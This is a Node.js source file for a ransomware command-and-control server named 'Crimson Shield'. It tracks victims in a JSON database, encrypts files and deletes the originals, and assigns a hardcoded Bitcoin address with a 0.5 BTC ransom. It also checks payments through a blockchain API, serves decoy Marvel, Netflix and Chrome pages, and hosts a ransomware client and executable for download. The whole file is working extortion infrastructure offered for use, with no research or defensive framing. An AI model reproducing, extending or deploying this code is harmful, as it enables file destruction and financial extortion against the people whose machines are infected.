const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');
const jwt = require('jsonwebtoken');
const axios = require('axios');
const { createServer } = require('http');
const { Server } = require('socket.io');
require('dotenv').config();

// ===== DATABASE =====
const VICTIMS_FILE = path.join(__dirname, 'database', 'victims.json');

if (!fs.existsSync(path.join(__dirname, 'database'))) {
    fs.mkdirSync(path.join(__dirname, 'database'));
}

let victims = [];
if (fs.existsSync(VICTIMS_FILE)) {
    victims = JSON.parse(fs.readFileSync(VICTIMS_FILE, 'utf8'));
}

function saveVictims() {
    fs.writeFileSync(VICTIMS_FILE, JSON.stringify(victims, null, 2));
}

// ===== ENCRYPTION ENGINE =====
class EncryptionEngine {
    constructor() {
        const keyString = process.env.ENCRYPTION_KEY || 'CRIMSON@CRYPT%09';
        this.key = crypto.createHash('sha256').update(keyString).digest();
        this.iv = crypto.randomBytes(16);
    }

    encryptFile(filePath) {
        const data = fs.readFileSync(filePath);
        const cipher = crypto.createCipheriv('aes-256-cbc', this.key, this.iv);
        const encrypted = Buffer.concat([cipher.update(data), cipher.final()]);
        const encryptedPath = filePath + '.crimson';
        fs.writeFileSync(encryptedPath, encrypted);
        fs.unlinkSync(filePath);
        return encryptedPath;
    }

    decryptFile(filePath) {
        const data = fs.readFileSync(filePath);
        const decipher = crypto.createDecipheriv('aes-256-cbc', this.key, this.iv);
        const decrypted = Buffer.concat([decipher.update(data), decipher.final()]);
        const originalPath = filePath.replace('.crimson', '');
        fs.writeFileSync(originalPath, decrypted);
        fs.unlinkSync(filePath);
        return originalPath;
    }

    getKey() {
        return {
            key: this.key.toString('hex'),
            iv: this.iv.toString('hex')
        };
    }
}

// ===== MAIN SERVER =====
class CrimsonServer {
    constructor() {
        this.app = express();
        this.server = createServer(this.app);
        this.io = new Server(this.server, { cors: { origin: '*' } });
        this.port = process.env.PORT || 3001;
        this.encryptionEngine = new EncryptionEngine();
        this.victimId = crypto.randomBytes(8).toString('hex');

        this.setupMiddleware();
        this.setupRoutes();
        this.setupWebSocket();
        this.setupCronJobs();
    }

    setupMiddleware() {
        this.app.use(cors());
        this.app.use(express.json());
        this.app.use(express.static('public'));
        
        this.app.use('/api/admin/*', (req, res, next) => {
            const token = req.headers['authorization'];
            if (!token) {
                return res.status(401).json({ error: 'Unauthorized' });
            }
            try {
                const decoded = jwt.verify(token, process.env.JWT_SECRET);
                req.admin = decoded;
                next();
            } catch (error) {
                return res.status(401).json({ error: 'Invalid token' });
            }
        });
    }

    setupRoutes() {
        // ===== PUBLIC ROUTES =====
        this.app.get('/', (req, res) => {
            res.sendFile(path.join(__dirname, 'public', 'marvel.html'));
        });

        this.app.get('/marvel', (req, res) => {
            res.sendFile(path.join(__dirname, 'public', 'marvel.html'));
        });

        this.app.get('/netflix', (req, res) => {
            res.sendFile(path.join(__dirname, 'public', 'netflix.html'));
        });

        this.app.get('/chrome', (req, res) => {
            res.sendFile(path.join(__dirname, 'public', 'chrome.html'));
        });

        this.app.get('/dashboard', (req, res) => {
            res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
        });

        // ===== ADMIN ROUTES =====
        this.app.post('/api/admin/login', (req, res) => {
            const { username, password } = req.body;
            if (username === process.env.ADMIN_USERNAME && 
                password === process.env.ADMIN_PASSWORD) {
                const token = jwt.sign({ admin: true }, process.env.JWT_SECRET, { expiresIn: '24h' });
                res.json({ success: true, token });
            } else {
                res.status(401).json({ error: 'Invalid credentials' });
            }
        });

        this.app.get('/api/admin/dashboard', (req, res) => {
            const totalVictims = victims.length;
            const paidVictims = victims.filter(v => v.paid).length;
            const totalBTC = victims.reduce((sum, v) => sum + (v.paid ? 0.5 : 0), 0);
            const recentVictims = victims.slice(-5).reverse();

            res.json({
                totalVictims,
                paidVictims,
                totalBTC,
                recentVictims,
                activeVictims: victims.filter(v => !v.paid && !v.decrypted).length
            });
        });

        this.app.get('/api/admin/victims', (req, res) => {
            res.json(victims);
        });

        this.app.get('/api/admin/victim/:id', (req, res) => {
            const victim = victims.find(v => v.id === req.params.id);
            if (!victim) {
                return res.status(404).json({ error: 'Victim not found' });
            }
            res.json(victim);
        });

        this.app.post('/api/admin/check-payment', async (req, res) => {
            const { victimId } = req.body;
            const victim = victims.find(v => v.id === victimId);
            
            if (!victim) {
                return res.status(404).json({ error: 'Victim not found' });
            }

            try {
                const paid = await this.checkBTCTransaction(victim.btcAddress);
                
                if (paid && !victim.paid) {
                    victim.paid = true;
                    victim.paidAt = new Date().toISOString();
                    saveVictims();
                    
                    this.io.emit('payment_confirmed', {
                        victimId: victim.id,
                        decryptionKey: victim.decryptionKey
                    });
                }

                res.json({
                    paid: victim.paid,
                    victimId: victim.id
                });
            } catch (error) {
                res.status(500).json({ error: 'Payment check failed' });
            }
        });

        this.app.post('/api/admin/generate-key', (req, res) => {
            const { victimId } = req.body;
            const victim = victims.find(v => v.id === victimId);
            
            if (!victim) {
                return res.status(404).json({ error: 'Victim not found' });
            }

            if (!victim.paid) {
                return res.status(400).json({ error: 'Victim has not paid' });
            }

            const decryptionKey = crypto.randomBytes(32).toString('hex');
            victim.decryptionKey = decryptionKey;
            victim.decrypted = true;
            saveVictims();

            res.json({
                success: true,
                victimId: victim.id,
                decryptionKey: decryptionKey
            });
        });

        // ===== CLIENT ROUTES =====
        this.app.get('/download/ransomware.js', (req, res) => {
            const clientPath = path.join(__dirname, 'client', 'ransomware.js');
            if (fs.existsSync(clientPath)) {
                res.download(clientPath, 'crimson.js');
            } else {
                res.status(404).send('Client not found');
            }
        });

        this.app.get('/download/CrimsonShield.exe', (req, res) => {
            const exePath = path.join(__dirname, 'builder', 'CrimsonShield.exe');
            if (fs.existsSync(exePath)) {
                res.download(exePath, 'CrimsonShield.exe');
            } else {
                res.status(404).send('EXE not found');
            }
        });

        this.app.post('/api/register-victim', (req, res) => {
            const { systemInfo, filesEncrypted } = req.body;
            
            const victim = {
                id: crypto.randomBytes(8).toString('hex'),
                victimId: this.victimId,
                btcAddress: process.env.BTC_ADDRESS || 'bc1qnjkxvj7avmet54w9rmzf0ldftwzh2fcwsdxuw7',
                encryptionKey: this.encryptionEngine.getKey(),
                systemInfo: systemInfo || {},
                filesEncrypted: filesEncrypted || 0,
                registeredAt: new Date().toISOString(),
                paid: false,
                paidAt: null,
                decrypted: false,
                decryptionKey: null
            };

            victims.push(victim);
            saveVictims();
            this.io.emit('new_victim', victim);

            res.json({
                success: true,
                victimId: victim.id,
                btcAddress: victim.btcAddress,
                ransomAmount: 0.5
            });
        });

        this.app.post('/api/encrypt', (req, res) => {
            const { filePath } = req.body;
            if (!filePath || !fs.existsSync(filePath)) {
                return res.status(400).json({ error: 'File not found' });
            }

            try {
                const encryptedPath = this.encryptionEngine.encryptFile(filePath);
                res.json({ success: true, encryptedPath });
            } catch (error) {
                res.status(500).json({ error: error.message });
            }
        });

        this.app.post('/api/decrypt', (req, res) => {
            const { filePath, decryptionKey } = req.body;
            
            if (!filePath || !fs.existsSync(filePath)) {
                return res.status(400).json({ error: 'File not found' });
            }

            const victim = victims.find(v => v.decryptionKey === decryptionKey);
            if (!victim) {
                return res.status(403).json({ error: 'Invalid decryption key' });
            }

            try {
                const originalPath = this.encryptionEngine.decryptFile(filePath);
                res.json({ success: true, originalPath });
            } catch (error) {
                res.status(500).json({ error: error.message });
            }
        });

        this.app.get('/api/health', (req, res) => {
            res.json({
                status: '💀 Crimson Shield Active',
                victimId: this.victimId,
                totalVictims: victims.length,
                timestamp: new Date().toISOString()
            });
        });
    }

    setupWebSocket() {
        this.io.on('connection', (socket) => {
            console.log('🔌 Client connected:', socket.id);
            socket.emit('connected', { 
                message: 'Connected to Crimson Shield Server' 
            });

            socket.on('disconnect', () => {
                console.log('🔌 Client disconnected:', socket.id);
            });
        });
    }

    setupCronJobs() {
        setInterval(async () => {
            const unpaidVictims = victims.filter(v => !v.paid);
            for (const victim of unpaidVictims) {
                try {
                    const paid = await this.checkBTCTransaction(victim.btcAddress);
                    if (paid) {
                        victim.paid = true;
                        victim.paidAt = new Date().toISOString();
                        saveVictims();
                        this.io.emit('payment_confirmed', {
                            victimId: victim.id
                        });
                        console.log(`💰 Payment confirmed for victim: ${victim.id}`);
                    }
                } catch (error) {
                    console.error('Payment check error:', error.message);
                }
            }
        }, 300000);
    }

    async checkBTCTransaction(address) {
        try {
            const response = await axios.get(
                `https://api.blockchair.com/bitcoin/dashboards/address/${address}`
            );
            const data = response.data.data[address];
            if (data && data.address && data.address.balance > 0) {
                return true;
            }
            return false;
        } catch (error) {
            return false;
        }
    }

    start() {
        this.server.listen(this.port, () => {
            const btcAddress = process.env.BTC_ADDRESS || 'Not Set';
            console.log('╔═══════════════════════════════════════════╗');
            console.log('║     🔴 CRIMSON SHIELD RANSOMWARE 🔴       ║');
            console.log('╠═══════════════════════════════════════════╣');
            console.log(`║  Server:    http://localhost:${this.port}       ║`);
            console.log(`║  Dashboard: http://localhost:${this.port}/dashboard ║`);
            console.log(`║  Victim ID: ${this.victimId.padEnd(20)}    ║`);
            console.log(`║  Victims:   ${String(victims.length).padEnd(20)}    ║`);
            console.log(`║  BTC Addr:  ${btcAddress.substring(0, 20)}...  ║`);
            console.log('╚═══════════════════════════════════════════╝');
            console.log('💀 Ready to infect!');
        });
    }
}

const server = new CrimsonServer();
server.start();
